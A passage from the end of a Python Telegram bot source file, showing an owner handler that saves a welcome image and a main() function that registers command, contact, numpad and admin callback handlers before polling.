                await update.message.reply_text(f"❌ {f_txt('Error')}: {e}")
        os.remove(file_path)
        user_states[uid] = None

    elif state == 'set_welcome_img_wait':
        photo_file = await update.message.photo[-1].get_file()
        file_path = f"/data/welcome_img.jpg"
        await photo_file.download_to_drive(file_path)
        db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (file_path,))
        await update.message.reply_text(f"✅ {f_txt('Welcome Image set successfully!')}")
        user_states[uid] = None

# ================== MAIN ==================
def main():
    threading.Thread(target=run_web, daemon=True).start()
    app_bot = Application.builder().token(BOT_TOKEN).build()

    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("owner", owner_panel))
    app_bot.add_handler(MessageHandler(filters.CONTACT, verify_contact_withdraw))
    app_bot.add_handler(CallbackQueryHandler(numpad_callback, pattern="^num_"))
    app_bot.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_|^check_|^edit_|^change_|^set_|^login_"))
    
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, owner_text_handler), group=0)
    app_bot.add_handler(MessageHandler(filters.PHOTO, owner_photo_handler), group=0)
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, menu_router), group=1)

    logger.info("Top Premium Bot Started.")
    app_bot.run_polling(allowed_updates=Update.ALL_TYPES, close_loop=False)

if __name__ == "__main__":
    main()
